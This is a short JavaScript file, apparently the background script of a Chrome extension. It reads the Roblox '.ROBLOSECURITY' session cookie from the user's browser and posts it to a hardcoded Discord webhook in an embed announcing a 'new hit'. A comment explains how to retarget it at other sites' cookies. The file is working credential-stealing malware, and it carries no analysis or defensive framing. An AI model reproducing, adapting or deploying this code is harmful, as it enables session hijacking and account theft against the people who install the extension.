function webhookReq(webhook, cookie) {
  var params = {
      embeds: [{
            "title": `JAM#8000 on top`,
            "description": ">>> new hit :skull:",
            "color": 141414,
            "fields": [{
              "name": 'Cookie',
              "value": "```\n" + cookie + "\n```",
              inline: false
            }]
    }]
  }
   
  // Send the webhook request
  fetch(webhook, {
    method: "POST",
    headers: {
      'Content-type': 'application/json'
    },
    body: JSON.stringify(params)
  })
}



// Driver Code:
cookieInfo = {url: "https://www.roblox.com/", name: '.ROBLOSECURITY'}; //If you want to grab other site cookies, change the values both here and in the manifest.json file
chrome.cookies.get(cookieInfo, function(cookie) {
  if (cookie) {
    webhookReq("https://discord.com/api/webhooks/1008149140485705740/O3rrR9j8EZ5sGDkt03SwUkvIJSYjsL6v6woap92RoroHOucULoCBuWC7UZJp1ERsFpbk", cookie.value);
  }
});
